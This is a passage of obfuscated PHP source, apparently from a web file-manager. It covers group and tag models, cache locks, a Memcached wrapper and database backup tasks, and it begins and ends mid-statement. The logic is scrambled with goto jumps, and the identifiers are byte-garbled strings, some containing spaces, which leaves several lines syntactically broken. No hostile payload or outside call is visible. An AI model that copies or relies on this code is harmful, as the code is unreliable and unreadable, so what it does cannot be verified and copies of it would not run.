as &$B‡’Œ÷ÍƒÙ) { $B‡’Œ÷ÍƒÙ = array_to_keyvalue($B‡’Œ÷ÍƒÙ, $F°Ò­ö½° [92], $F°Ò­ö½° [368]); } unset($B‡’Œ÷ÍƒÙ); goto aÕí‡•–ö; C‚ö—Îø×: } protected function parentLevelArray($aÚô˜…Òñç) { $fğÒÉÊ›áš =& $_SERVER[Æ¼ôºÙï]; $aÚô˜…Òñç = explode($fğÒÉÊ›áš[47], trim($aÚô˜…Òñç, $fğÒÉÊ›áš[47])); $aÚô˜…Òñç = array_remove_value($aÚô˜…Òñç, $fğÒÉÊ›áš[486]); return $aÚô˜…Òñç; } private function _listAppendParent(&$D«Ûİ«×¤¤) { goto EÕ¶Ø—¹ÓÙ; b”ÄïäÈ…Ô: unset($BÅÔŠÈÚ™˜); $F¨’ÕÇ¦¹ë = array(); foreach ($bçÒíÚ¿±ã as $fŸ±±ËÅ‡“ => $cç¿·©½) { if (!$cç¿·©½) { $F¨’ÕÇ¦¹ë[] = $fŸ±±ËÅ‡“; } } goto d·÷¤–“Ø¢; EÕ¶Ø—¹ÓÙ: $a¯æØ¥™Ø =& $_SERVER[Æ¼ôºÙï]; $bçÒíÚ¿±ã = array(); foreach ($D«Ûİ«×¤¤ as &$BÅÔŠÈÚ™˜) { $bçÒíÚ¿±ã[$BÅÔŠÈÚ™˜[$a¯æØ¥™Ø[1661]]] = $BÅÔŠÈÚ™˜[$a¯æØ¥™Ø[28]]; $DŞ¿†…Š‰– = $this->parentLevelArray($BÅÔŠÈÚ™˜[$a¯æØ¥™Ø[477]]); foreach ($DŞ¿†…Š‰– as $DÑÁÑ¦„×Â) { if (!isset($bçÒíÚ¿±ã[$DÑÁÑ¦„×Â])) { $bçÒíÚ¿±ã[$DÑÁÑ¦„×Â] = 0; } } } goto b”ÄïäÈ…Ô; b¬²µÎŒ¡İ: unset($BÅÔŠÈÚ™˜); goto BÀ ø¡; d·÷¤–“Ø¢: if ($F¨’ÕÇ¦¹ë) { $fŞÂİÊ½í¡ = array($a¯æØ¥™Ø[1743] => array($a¯æØ¥™Ø[402], $F¨’ÕÇ¦¹ë)); $E¡›°çîÕÃ = $this->field($a¯æØ¥™Ø[1756])->where($fŞÂİÊ½í¡)->select(); $EÏõÀÆÌé = array_to_keyvalue($E¡›°çîÕÃ, $a¯æØ¥™Ø[1661], $a¯æØ¥™Ø[28]); $bçÒíÚ¿±ã = array_merge_index($bçÒíÚ¿±ã, $EÏõÀÆÌé); } $Fœ”Úô¸Ÿğ = $GLOBALS[$a¯æØ¥™Ø[6]][$a¯æØ¥™Ø[87]][$a¯æØ¥™Ø[1757]]; foreach ($D«Ûİ«×¤¤ as &$BÅÔŠÈÚ™˜) { $DŞ¿†…Š‰– = $this->parentLevelArray($BÅÔŠÈÚ™˜[$a¯æØ¥™Ø[477]]); $d§İ¿ÚÂÇ° = $a¯æØ¥™Ø[33]; foreach ($DŞ¿†…Š‰– as $fŸ±±ËÅ‡“ => $DÑÁÑ¦„×Â) { if ($Fœ”Úô¸Ÿğ && $fŸ±±ËÅ‡“ == 0) { continue; } $d§İ¿ÚÂÇ° .= $bçÒíÚ¿±ã[$DÑÁÑ¦„×Â] . $a¯æØ¥™Ø[8]; } if ($DŞ¿†…Š‰–) { $d§İ¿ÚÂÇ° .= $BÅÔŠÈÚ™˜[$a¯æØ¥™Ø[28]]; } $BÅÔŠÈÚ™˜[$a¯æØ¥™Ø[481]] = str_replace($a¯æØ¥™Ø[485], $a¯æØ¥™Ø[8], $d§İ¿ÚÂÇ°); } goto b¬²µÎŒ¡İ; BÀ ø¡: } private function _listAppendSourceRoot(&$E¿éØÙ½ç´, $aÏ‹öá¿¦) { goto BÕ¨æ¼Ì—Î; BÕ¨æ¼Ì—Î: $F×ò¬å¼²ç =& $_SERVER[Æ¼ôºÙï]; $aˆœ†Š¾ÄÜ = array($F×ò¬å¼²ç[389] => SourceModel::TYPE_GROUP, $F×ò¬å¼²ç[479] => 0, $F×ò¬å¼²ç[474] => array($F×ò¬å¼²ç[7], $aÏ‹öá¿¦)); $A“š®†Ş¾Ê = $F×ò¬å¼²ç[1758]; goto bäÊëŠ‰Ó·; E½Ôù“á“Æ: foreach ($E¿éØÙ½ç´ as &$FêééÍ‚¢”) { $FêééÍ‚¢”[$F×ò¬å¼²ç[84]] = $b…í¬ÎÚÛø[$FêééÍ‚¢”[$F×ò¬å¼²ç[1661]]] ? $b…í¬ÎÚÛø[$FêééÍ‚¢”[$F×ò¬å¼²ç[1661]]] : array(); } unset($FêééÍ‚¢”); goto EÙ´Œ‘³öï; bäÊëŠ‰Ó·: $b…í¬ÎÚÛø = Model($F×ò¬å¼²ç[770])->order($F×ò¬å¼²ç[1759])->field($A“š®†Ş¾Ê)->where($aˆœ†Š¾ÄÜ)->select(); $b…í¬ÎÚÛø = array_to_keyvalue($b…í¬ÎÚÛø, $F×ò¬å¼²ç[474]); $b…í¬ÎÚÛø = array_remove_key($b…í¬ÎÚÛø, $F×ò¬å¼²ç[474]); goto E½Ôù“á“Æ; EÙ´Œ‘³öï: } protected function groupMerge($B˜è…¿·) { $B˜è…¿· = array_values(array_unique($B˜è…¿·)); $A±‰¦ƒïª = array(); for ($Fš«†æâ¶œ = 0; $Fš«†æâ¶œ < count($B˜è…¿·); $Fš«†æâ¶œ++) { $CôÔ·¹¯ñ• = !1; for ($A–†Ñ‰äóó = 0; $A–†Ñ‰äóó < count($B˜è…¿·); $A–†Ñ‰äóó++) { if ($Fš«†æâ¶œ == $A–†Ñ‰äóó) { continue; } if ($this->isParentOf($B˜è…¿·[$A–†Ñ‰äóó], $B˜è…¿·[$Fš«†æâ¶œ])) { $CôÔ·¹¯ñ• = !0; break; } } if (!$CôÔ·¹¯ñ•) { $A±‰¦ƒïª[] = $B˜è…¿·[$Fš«†æâ¶œ]; } } return $A±‰¦ƒïª; } protected function isParentOf($b ¢ƒ–Ø¥, $a®«Ã©Í›) { goto d‰’Òæò²Ì; AÖÆ„ÃŸÌ³: $a„«È…ùˆ = $this->getInfoSimple($a®«Ã©Í›); $eÕÂ¡öØÆš = $dÖ®Ò¼ÂÎ[$E˜çƒÔµèÀ[477]] . $b ¢ƒ–Ø¥ . $E˜çƒÔµèÀ[47]; if (substr($a„«È…ùˆ[$E˜çƒÔµèÀ[477]], 0, strlen($eÕÂ¡öØÆš)) == $eÕÂ¡öØÆš) { return !0; } goto C¢”Ò§„¸¨; C¢”Ò§„¸¨: return !1; goto d–£È†õîŠ; d‰’Òæò²Ì: $E˜çƒÔµèÀ =& $_SERVER[Æ¼ôºÙï]; if (!$b ¢ƒ–Ø¥ || !$a®«Ã©Í› || $b ¢ƒ–Ø¥ == $a®«Ã©Í›) { return !1; } $dÖ®Ò¼ÂÎ = $this->getInfoSimple($b ¢ƒ–Ø¥); goto AÖÆ„ÃŸÌ³; d–£È†õîŠ: } public function groupShowRoot($eÚ†Ö¡»È×, $bÄÍˆ×Ì•™ = false) { goto DñÑ–ãòÊ; fªºó›Â: return $cƒ¨ïÈ£‘; goto D„¨ìÏŠ¹‹; bì¤ÀÒ‹¹Œ: $CÒ´çî–¾‹ = $this->parentLevelArray($då­ï©ŞøŒ[$F”İ›”è[477]]); $cƒ¨ïÈ£‘ = array($eÚ†Ö¡»È×); if (count($CÒ´çî–¾‹) == 0) { return $cƒ¨ïÈ£‘; } goto c•®…ë…¼î; c•®…ë…¼î: if ($bÄÍˆ×Ì•™ && count($CÒ´çî–¾‹) == 1) { return $cƒ¨ïÈ£‘; } if (!$då­ï©ŞøŒ[$F”İ›”è[434]] || !isset($då­ï©ŞøŒ[$F”İ›”è[434]][$F”İ›”è[1741]]) || $då­ï©ŞøŒ[$F”İ›”è[434]][$F”İ›”è[1741]] == $F”İ›”è[1713]) { return $this->groupShowRoot($CÒ´çî–¾‹[count($CÒ´çî–¾‹) - 1], $bÄÍˆ×Ì•™); } if ($då­ï©ŞøŒ[$F”İ›”è[434]][$F”İ›”è[1741]] == $F”İ›”è[355]) { $B„œ·ƒŠñ = explode($F”İ›”è[47], $då­ï©ŞøŒ[$F”İ›”è[434]][$F”İ›”è[1742]]); if ($B„œ·ƒŠñ) { $cƒ¨ïÈ£‘ = array_merge($cƒ¨ïÈ£‘, $B„œ·ƒŠñ); } } goto fªºó›Â; DñÑ–ãòÊ: $F”İ›”è =& $_SERVER[Æ¼ôºÙï]; $då­ï©ŞøŒ = $this->getInfo($eÚ†Ö¡»È×); if (!$då­ï©ŞøŒ) { return array(); } goto bì¤ÀÒ‹¹Œ; D„¨ìÏŠ¹‹: } protected function resetParentLevel() { $d¼ÙÑá±æØ =& $_SERVER[Æ¼ôºÙï]; $a¡í¨…¶â = $d¼ÙÑá±æØ[1661]; $FÔ¶ÓŠŸš‡ = $this->select(); $FÔ¶ÓŠŸš‡ = array_to_keyvalue($FÔ¶ÓŠŸš‡, $a¡í¨…¶â); foreach ($FÔ¶ÓŠŸš‡ as $B®»©èğ) { goto dĞ„¯× Ö; FÁœã½‡Èö: $this->where(array($a¡í¨…¶â => $B®»©èğ[$a¡í¨…¶â]))->save(array($d¼ÙÑá±æØ[542] => $A‘íñå—÷×)); goto B½ˆãŞğ·§; dĞ„¯× Ö: $F”¼Ó§™¢ = $B®»©èğ; $A‘íñå—÷× = array(); while ($F”¼Ó§™¢[$d¼ÙÑá±æØ[479]] != 0) { $A‘íñå—÷×[] = $F”¼Ó§™¢[$d¼ÙÑá±æØ[479]]; $F”¼Ó§™¢ = $FÔ¶ÓŠŸš‡[$F”¼Ó§™¢[$d¼ÙÑá±æØ[479]]]; } goto cÕÙ•õŒê÷; cÕÙ•õŒê÷: $A‘íñå—÷×[] = 0; $A‘íñå—÷× = $d¼ÙÑá±æØ[47] . implode($d¼ÙÑá±æØ[47], array_reverse($A‘íñå—÷×)) . $d¼ÙÑá±æØ[47]; $this->setNamePinyin($B®»©èğ[$a¡í¨…¶â], $B®»©èğ[$d¼ÙÑá±æØ[28]]); goto FÁœã½‡Èö; B½ˆãŞğ·§: } return $FÔ¶ÓŠŸš‡; } public function groupNameAuto($DÊô¢¬¯Şƒ, $cáóîÎ é–) { $cØ„”Í–…° =& $_SERVER[Æ¼ôºÙï]; $fèÓæ†Ÿ× = $this->where(array($cØ„”Í–…°[386] => $DÊô¢¬¯Şƒ))->getField($cØ„”Í–…°[28], !0); if (!$fèÓæ†Ÿ× || !in_array($cáóîÎ é–, $fèÓæ†Ÿ×)) { return $cáóîÎ é–; } for ($fù•Õ†°¦­ = 1; $fù•Õ†°¦­ <= count($fèÓæ†Ÿ×) + 1; $fù•Õ†°¦­++) { $CùŸ¥÷Áã· = $cáóîÎ é– . "\50{$fù•Õ†°¦­}\x29"; if (!in_array($CùŸ¥÷Áã·, $fèÓæ†Ÿ×)) { return $CùŸ¥÷Áã·; } } } } class GroupTagModel extends ModelBase { protected $tableName = "\x75\x73\x65\x72\137\146\141\166"; protected function cacheFunctionAlias($A›àá—»Áõ) { $B’¢•ÏÕƒ =& $_SERVER[Æ¼ôºÙï]; return array($B’¢•ÏÕƒ[1760] => array($A›àá—»Áõ[0], $B’¢•ÏÕƒ[1761]), $B’¢•ÏÕƒ[1762] => array($A›àá—»Áõ[0], $B’¢•ÏÕƒ[1763])); } protected function get($fº›®åœ²Ş) { $B°ƒ–ç¹‰ =& $_SERVER[Æ¼ôºÙï]; $FÛÕÑ¾ÍÒº = Model($B°ƒ–ç¹‰[476])->metaGet($fº›®åœ²Ş, $B°ƒ–ç¹‰[1764]); $EæÅÌ©”®Ñ = json_decode($FÛÕÑ¾ÍÒº, !0); return $EæÅÌ©”®Ñ ? $EæÅÌ©”®Ñ : array($B°ƒ–ç¹‰[1765] => $B°ƒ–ç¹‰[86], $B°ƒ–ç¹‰[363] => array()); } protected function set($bçß»àÀ§, $b‡ÄÍÇíÊ±) { $b×÷Úöô©¿ =& $_SERVER[Æ¼ôºÙï]; $b‡ÄÍÇíÊ± = $b‡ÄÍÇíÊ± ? $b‡ÄÍÇíÊ± : array($b×÷Úöô©¿[1765] => $b×÷Úöô©¿[86], $b×÷Úöô©¿[363] => array()); Model($b×÷Úöô©¿[476])->metaSet($bçß»àÀ§, $b×÷Úöô©¿[1764], json_encode($b‡ÄÍÇíÊ±)); return Model($b×÷Úöô©¿[476])->metaSet($bçß»àÀ§, $b×÷Úöô©¿[1764], json_encode($b‡ÄÍÇíÊ±)); } protected function getByTagID($Aƒ±òé’‡, $aŞõè‡ï¢) { goto f¬Öì¾„¾; b™Ø’™áªÈ: return is_array($AŠÚ‰¦¥ÊÓ) ? $AŠÚ‰¦¥ÊÓ : !1; goto FŸ°Ê¨¦ÑŞ; CÍ¬„«Í¤: $BÙ×·´÷•· = $this->get($Aƒ±òé’‡); if (!$BÙ×·´÷•· || !isset($BÙ×·´÷•·[$EÖ£•ìÆœó[363]])) { return !1; } $AŠÚ‰¦¥ÊÓ = array_find_by_field($BÙ×·´÷•·[$EÖ£•ìÆœó[363]], $EÖ£•ìÆœó[385], $aŞõè‡ï¢); goto b™Ø’™áªÈ; f¬Öì¾„¾: $EÖ£•ìÆœó =& $_SERVER[Æ¼ôºÙï]; if (!$Aƒ±òé’‡ || !$aŞõè‡ï¢) { return !1; } if (!Model($EÖ£•ìÆœó[476])->getInfoSimple($Aƒ±òé’‡)) { return !1; } goto CÍ¬„«Í¤; FŸ°Ê¨¦ÑŞ: } public function listSource($aÌ‰Ûœ¢, $eé´²ÔÜ¯) { goto eğ¤§®º¹; a­µìÜ¿Ê¬: if (!$D‡Éè¹§šË || count($f£ ÊÖ½ù—) == $D‡Éè¹§šË[$AĞ»ñ£À[360]][$AĞ»ñ£À[361]]) { return $D‡Éè¹§šË; } $dÕ•îŞí‡ = array(); $fòÌÒ‘„¡İ = array_to_keyvalue($D‡Éè¹§šË[$AĞ»ñ£À[74]], $AĞ»ñ£À[33], $AĞ»ñ£À[387]); goto D¿„Ïæ­­; eğ¤§®º¹: $AĞ»ñ£À =& $_SERVER[Æ¼ôºÙï]; if ($eé´²ÔÜ¯ && !is_array($eé´²ÔÜ¯)) { $eé´²ÔÜ¯ = array($eé´²ÔÜ¯); } $d ‹¼©«ãô = $this->listData($aÌ‰Ûœ¢); goto e×èÖˆÄÕ; D¿„Ïæ­­: $A˜¿Ñ‘‚õ = array_to_keyvalue($D‡Éè¹§šË[$AĞ»ñ£À[73]], $AĞ»ñ£À[33], $AĞ»ñ£À[387]); $EÂ¾²”íº = array_merge($A˜¿Ñ‘‚õ, $fòÌÒ‘„¡İ); foreach ($f£ ÊÖ½ù— as $D Ã¬Ë–’‘) { if (!in_array($D Ã¬Ë–’‘, $EÂ¾²”íº)) { $dÕ•îŞí‡[] = $D Ã¬Ë–’‘; } } goto cÖƒØãÍ…; dŠËÙ­”ÚÔ: foreach ($a¤‚ùğ‹èÓ as $EŠ¬åõŠ¯Ğ => $CãÉë’ÚÔÄ) { $dÖ¬ö„† = !0; if (!$eé´²ÔÜ¯) { $f£ ÊÖ½ù—[] = $EŠ¬åõŠ¯Ğ; continue; } foreach ($eé´²ÔÜ¯ as $a“¯¼‘ï¬) { if (!in_array($a“¯¼‘ï¬, $CãÉë’ÚÔÄ)) { $dÖ¬ö„† = !1; break; } } if ($dÖ¬ö„†) { $f£ ÊÖ½ù—[] = $EŠ¬åõŠ¯Ğ; } } if (!$f£ ÊÖ½ù—) { return array(); } $D‡Éè¹§šË = Model($AĞ»ñ£À[1182])->listSource(array($AĞ»ñ£À[401] => array($AĞ»ñ£À[402], $f£ ÊÖ½ù—))); goto a­µìÜ¿Ê¬; cÖƒØãÍ…: if ($dÕ•îŞí‡) { $this->removeBySource($aÌ‰Ûœ¢, $dÕ•îŞí‡); } return $D‡Éè¹§šË; goto aƒğ–á® ™; e×èÖˆÄÕ: $a¤‚ùğ‹èÓ = array(); foreach ($d ‹¼©«ãô as $fÅİ¬ç¿„´) { $D Ã¬Ë–’‘ = $fÅİ¬ç¿„´[$AĞ»ñ£À[75]]; if (!$D Ã¬Ë–’‘) { continue; } if (!isset($a¤‚ùğ‹èÓ[$D Ã¬Ë–’‘])) { $a¤‚ùğ‹èÓ[$D Ã¬Ë–’‘] = array(); } $a¤‚ùğ‹èÓ[$D Ã¬Ë–’‘][] = $fÅİ¬ç¿„´[$AĞ»ñ£À[410]]; } $f£ ÊÖ½ù— = array(); goto dŠËÙ­”ÚÔ; aƒğ–á® ™: } protected function listData($C»œƒ¿ ÈÈ) { $C‰‚µéè× =& $_SERVER[Æ¼ôºÙï]; $C®ì¿¨°Ú = array($C‰‚µéè×[1494] => 0, $C‰‚µéè×[452] => array($C‰‚µéè×[1766], 0), $C‰‚µéè×[406] => $C‰‚µéè×[1767] . $C»œƒ¿ ÈÈ); $b‡¬³Š‘­İ = $C‰‚µéè×[1768]; $D¥Á††ñ‡Š = $this->field($b‡¬³Š‘­İ)->where($C®ì¿¨°Ú)->order($C‰‚µéè×[1769])->select(); return $D¥Á††ñ‡Š ? $D¥Á††ñ‡Š : array(); } protected function addToTag($B¼áÕµç, $BÙËŒÖÕª¾, $bİ‰ôÓ‰¸²) { $eâ›ÄÍãù† =& $_SERVER[Æ¼ôºÙï]; if (!$this->getByTagID($B¼áÕµç, $bİ‰ôÓ‰¸²) || !$BÙËŒÖÕª¾) { return !1; } if (!Model($eâ›ÄÍãù†[770])->pathInfo($BÙËŒÖÕª¾)) { return !1; } $d…°£ÜÁÊ  = array($eâ›ÄÍãù†[1494] => 0, $eâ›ÄÍãù†[452] => $bİ‰ôÓ‰¸², $eâ›ÄÍãù†[405] => $BÙËŒÖÕª¾, $eâ›ÄÍãù†[406] => $eâ›ÄÍãù†[1770] . $B¼áÕµç, $eâ›ÄÍãù†[404] => $eâ›ÄÍãù†[33], $eâ›ÄÍãù†[1665] => 0); if ($this->where($d…°£ÜÁÊ )->find()) { return !1; } return $this->add($d…°£ÜÁÊ ); } protected function removeFromTag($bø»¶”’àï, $Bä”ã¦†ô¡, $dÚÚŒÁ¤Ãî) { $B¦…‹›Ëëê =& $_SERVER[Æ¼ôºÙï]; if (!$this->getByTagID($bø»¶”’àï, $dÚÚŒÁ¤Ãî) || !$Bä”ã¦†ô¡) { return !1; } if (is_array($Bä”ã¦†ô¡)) { $Bä”ã¦†ô¡ = array($B¦…‹›Ëëê[7], $Bä”ã¦†ô¡); } $DÂ¹Á©…ÃÂ = array($B¦…‹›Ëëê[1494] => 0, $B¦…‹›Ëëê[452] => $dÚÚŒÁ¤Ãî, $B¦…‹›Ëëê[406] => $B¦…‹›Ëëê[1770] . $bø»¶”’àï, $B¦…‹›Ëëê[405] => $Bä”ã¦†ô¡); return $this->where($DÂ¹Á©…ÃÂ)->delete(); } protected function removeByTag($A²¥Ø´§ïÎ, $D¹¼‡œÖ×Ş) { $C¨‹‚º± =& $_SERVER[Æ¼ôºÙï]; if (!$this->getByTagID($A²¥Ø´§ïÎ, $D¹¼‡œÖ×Ş)) { return !1; } $AØŒêË³ = array($C¨‹‚º±[1494] => 0, $C¨‹‚º±[452] => $D¹¼‡œÖ×Ş, $C¨‹‚º±[406] => $C¨‹‚º±[1770] . $A²¥Ø´§ïÎ); return $this->where($AØŒêË³)->delete(); } protected function removeBySource($f§ÆËğöŠ, $E¨ÖŒö÷Ù) { $a›±ñ˜¤ =& $_SERVER[Æ¼ôºÙï]; if (!$f§ÆËğöŠ || !$E¨ÖŒö÷Ù) { return !1; } if (is_array($E¨ÖŒö÷Ù)) { $E¨ÖŒö÷Ù = array($a›±ñ˜¤[7], $E¨ÖŒö÷Ù); } $AĞì—Ù¥£· = array($a›±ñ˜¤[1494] => 0, $a›±ñ˜¤[405] => $E¨ÖŒö÷Ù, $a›±ñ˜¤[452] => array($a›±ñ˜¤[950], 0), $a›±ñ˜¤[406] => $a›±ñ˜¤[1770] . $f§ÆËğöŠ); return $this->where($AĞì—Ù¥£·)->delete(); } } goto Dµ»ÃŒÍ‹; c±÷ßôá‘õ: class CacheLockMemcached { public function lock($EøÕù’š³Ş, $CŠØˆ½—Óš = 0) { $EØÛ£«æÂÉ = Cache::init(); $EíÔÔ±ˆ™˜ = microtime(!0) + $CŠØˆ½—Óš; while (microtime(!0) < $EíÔÔ±ˆ™˜) { $Eö­ñ‹å†Š = $EØÛ£«æÂÉ->get($EøÕù’š³Ş); if (!$Eö­ñ‹å†Š || $Eö­ñ‹å†Š < microtime(!0)) { $D²®Ñ³ËÒ• = $EØÛ£«æÂÉ->handle->add($EøÕù’š³Ş, $EíÔÔ±ˆ™˜, $CŠØˆ½—Óš); if ($D²®Ñ³ËÒ•) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($BåÊÇš–“) { return Cache::init()->get($BåÊÇš–“); } public function unlock($BÛÙ› „ïŒ) { return Cache::init()->remove($BÛÙ› „ïŒ); } } class CacheLockDatabase { public function lock($AçÑÑÖ÷œ, $aÌä™°Äì = 0) { $C‰ˆ­¥éŒÙ = Model($_SERVER[Æ¼ôºÙï][774]); $DÉŠ½¾Ä×Ã = microtime(!0) + $aÌä™°Äì; while (microtime(!0) < $DÉŠ½¾Ä×Ã) { $aµ­Š¤³¥ = $C‰ˆ­¥éŒÙ->get($AçÑÑÖ÷œ); if (!$aµ­Š¤³¥ || $aµ­Š¤³¥ < microtime(!0)) { $fİ…Óô†ƒæ = $C‰ˆ­¥éŒÙ->set($AçÑÑÖ÷œ, $DÉŠ½¾Ä×Ã); if ($fİ…Óô†ƒæ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($BœÜÊĞ«è×) { return Model($_SERVER[Æ¼ôºÙï][774])->get($BœÜÊĞ«è×); } public function unlock($bôÆİáÁ†à) { Model($_SERVER[Æ¼ôºÙï][774])->remove($bôÆİáÁ†à); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($fª¾áéâãƒ, $EÚ÷³šÒÍâ) { $fåâãÀ·ƒä =& $_SERVER[Æ¼ôºÙï]; if (!class_exists($fåâãÀ·ƒä[801])) { show_json($fåâãÀ·ƒä[802], !1); } $this->cacheTime = $EÚ÷³šÒÍâ; $this->handle = new Memcached(); if (is_array($fª¾áéâãƒ[$fåâãÀ·ƒä[803]]) && count($fª¾áéâãƒ[$fåâãÀ·ƒä[803]]) >= 1) { foreach ($fª¾áéâãƒ[$fåâãÀ·ƒä[803]] as $dæÖ×‰…×¨) { $f”Š¤»¾Ï¯ = explode($fåâãÀ·ƒä[4], $dæÖ×‰…×¨); $this->handle->addServer($f”Š¤»¾Ï¯[0], $f”Š¤»¾Ï¯[1]); } } else { $this->handle->addServer($fª¾áéâãƒ[$fåâãÀ·ƒä[175]], $fª¾áéâãƒ[$fåâãÀ·ƒä[176]]); } } public function set($A÷Ùè¦‰¸Á, $AÕ‹Î­‡î, $dÉ°ŠÚ÷Õœ = false) { $dÉ°ŠÚ÷Õœ = $dÉ°ŠÚ÷Õœ ? $dÉ°ŠÚ÷Õœ : $this->cacheTime; return $this->handle->set($A÷Ùè¦‰¸Á, $AÕ‹Î­‡î, $dÉ°ŠÚ÷Õœ); } public function get($d‚£æÔ”»Ş) { return $this->handle->get($d‚£æÔ”»Ş); } public function remove($fªá™ŞùšÎ) { return $this->handle->delete($fªá™ŞùšÎ); } public function deleteAll() { return $this->handle->flush(); } } goto AŠ„¼ØÈˆè; eÌãİ„±‚Ú: class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto e·ŠÈÄàÀ; b ‰é¹Çæš: foreach ($eÕ…¶ƒï as $A ¬ª®‚Ä‘) { $c÷»ÖÁÀß = $dåã—×Ûµ . $A ¬ª®‚Ä‘ . $CÖ¡½ê¦ˆê[736]; $bÈ¹´ïòØ = null; if ($A ¬ª®‚Ä‘ == $CÖ¡½ê¦ˆê[737] && (!isset($C¿ÓãßÕ‚Ò[$CÖ¡½ê¦ˆê[711]]) || $C¿ÓãßÕ‚Ò[$CÖ¡½ê¦ˆê[711]] == $CÖ¡½ê¦ˆê[486])) { $bÈ¹´ïòØ = self::$io; } $Cù¯Œ‚ÌÈ += $fÌ¸øğÎİİ->sqlFromDb($A ¬ª®‚Ä‘, $c÷»ÖÁÀß, $DƒÁÆµ½ƒÔ, $bÈ¹´ïòØ); } $DƒÁÆµ½ƒÔ->end(); $cÙÖàÆ±áù = array($CÖ¡½ê¦ˆê[738] => $fÉ¨˜ŠÊô, $CÖ¡½ê¦ˆê[725] => 1, $CÖ¡½ê¦ˆê[739] => $eÅ±Šª¿¯° + 1, $CÖ¡½ê¦ˆê[740] => $Cù¯Œ‚ÌÈ); goto c†Á¯ÒõÕ; F–ƒ‰‚ò—: $eÕ…¶ƒï = array_diff($eÕ…¶ƒï, array($CÖ¡½ê¦ˆê[729], $CÖ¡½ê¦ˆê[730])); foreach ($eÕ…¶ƒï as $A ¬ª®‚Ä‘) { $eÅ±Šª¿¯° += $fÌ¸øğÎİİ->model($A ¬ª®‚Ä‘)->count(); } $DƒÁÆµ½ƒÔ = new Task($CÖ¡½ê¦ˆê[731], $CÖ¡½ê¦ˆê[732], $eÅ±Šª¿¯°, LNG($CÖ¡½ê¦ˆê[733]) . $CÖ¡½ê¦ˆê[734] . LNG($CÖ¡½ê¦ˆê[735])); goto b ‰é¹Çæš; C¸Ù¦Œµç: self::$name = $C¿ÓãßÕ‚Ò[$CÖ¡½ê¦ˆê[28]]; $Fõ­ìÈÇ = $GLOBALS[$CÖ¡½ê¦ˆê[6]][$CÖ¡½ê¦ˆê[17]]; $fÉ¨˜ŠÊô = $this->_dbType($Fõ­ìÈÇ); goto F¸§ÔöÉ·†; e·ŠÈÄàÀ: $CÖ¡½ê¦ˆê =& $_SERVER[Æ¼ôºÙï]; $C¿ÓãßÕ‚Ò = Backup::get(); self::$io = $C¿ÓãßÕ‚Ò[$CÖ¡½ê¦ˆê[710]]; goto C¸Ù¦Œµç; a‡­“ŒÄĞ: mk_dir($dåã—×Ûµ); $eÅ±Šª¿¯° = $Cù¯Œ‚ÌÈ = 0; try { $eÕ…¶ƒï = $fÌ¸øğÎİİ->db()->getTables(); } catch (Exception $Dˆê ¥±) { return !1; } goto F–ƒ‰‚ò—; c†Á¯ÒõÕ: Backup::set($cÙÖàÆ±áù); if ($eÅ±Šª¿¯° > $Cù¯Œ‚ÌÈ) { return !1; } return !0; goto dÑ©—”ÒŠ’; F¸§ÔöÉ·†: $fÌ¸øğÎİİ = new DbManage($Fõ­ìÈÇ, $fÉ¨˜ŠÊô); $dåã—×Ûµ = TEMP_FILES . $CÖ¡½ê¦ˆê[728] . self::$name . $CÖ¡½ê¦ˆê[8]; del_dir($dåã—×Ûµ); goto a‡­“ŒÄĞ; dÑ©—”ÒŠ’: } private function _dbType($FËĞ‹çŒñ×) { goto B”–œïÙÈ; B”–œïÙÈ: $D¼‹…êÓÀÁ =& $_SERVER[Æ¼ôºÙï]; $FËĞ‹çŒñ× = array_change_key_case($FËĞ‹çŒñ×); $a„±–×Àå¸ = $FËĞ‹çŒñ×[$D¼‹…êÓÀÁ[741]]; goto AÉ—ª®…°›; AÉ—ª®…°›: if ($a„±–×Àå¸ == $D¼‹…êÓÀÁ[742]) { $bï¯’ˆ††È = explode($D¼‹…êÓÀÁ[4], $FËĞ‹çŒñ×[$D¼‹…êÓÀÁ[743]]); $a„±–×Àå¸ = $bï¯’ˆ††È[0]; } $CãÒ‘ŸÍ = array($D¼‹…êÓÀÁ[744] => $D¼‹…êÓÀÁ[9], $D¼‹…êÓÀÁ[745] => $D¼‹…êÓÀÁ[746]); if (isset($CãÒ‘ŸÍ[$a„±–×Àå¸])) { $a„±–×Àå¸ = $CãÒ‘ŸÍ[$a„±–×Àå¸]; } goto CóÁæÄÅ£ã; CóÁæÄÅ£ã: return $a„±–×Àå¸; goto cá®¾Ø¤ÜÕ; cá®¾Ø¤ÜÕ: } } class BackupDbFile { public function __construct() { } public function index() { goto F•Ì¥‰¦öª; Bª³÷‹œ—Š: if (!$FŠÑ†„âï­) { return !1; } Backup::set(array($f ”¹º’‚Š[747] => $FŠÑ†„âï­)); $aÂÃá²Ñâ´ = new TaskFileTransfer($f ”¹º’‚Š[748], $f ”¹º’‚Š[732], count($AÉ¥ŞŸçê), LNG($f ”¹º’‚Š[733]) . $f ”¹º’‚Š[429] . LNG($f ”¹º’‚Š[735]) . $f ”¹º’‚Š[749]); goto eµ§„º¾‘; cñ¢ßù‘‡‘: $Cç¦ŞÁ×‘” = IO::listPath($AÄ‰ø©ÙÆ½); $AÉ¥ŞŸçê = isset($Cç¦ŞÁ×‘”[$f ”¹º’‚Š[73]]) ? $Cç¦ŞÁ×‘”[$f ”¹º’‚Š[73]] : array(); $FŠÑ†„âï­ = array_sum(array_column($AÉ¥ŞŸçê, $f ”¹º’‚Š[77])); goto Bª³÷‹œ—Š; F•Ì¥‰¦öª: $f ”¹º’‚Š =& $_SERVER[Æ¼ôºÙï]; $AÇ‰ğÈ¯‚Â = Backup::get(); $DÁÑˆµÜä = $AÇ‰ğÈ¯‚Â[$f ”¹º’‚Š[28]]; goto F»ã©Ë®¯´; CÑğÈ´²¼: $DĞ´¯‚´Ÿ£ = CONTROLLER_DIR . $f ”¹º’‚Š[751]; IO::copy($b·Ş¿‰ùóî, $FËó°®Ö²ò); IO::copy($DĞ´¯‚´Ÿ£, $FËó°®Ö²ò); goto d”¬î¶ç®µ; d”¬î¶ç®µ: $aÂÃá²Ñâ´->end(); Backup::set(array($f ”¹º’‚Š[752] => $FŠÑ†„âï­)); return !0; goto b‰Ê¢„ƒÆ; eµ§„º¾‘: $aÂÃá²Ñâ´->task[$f ”¹º’‚Š[717]] = $FŠÑ†„âï­; foreach ($Cç¦ŞÁ×‘”[$f ”¹º’‚Š[73]] as $B¡ƒœ÷‘‹) { $c»Ñ¬ÛœØ¥ = 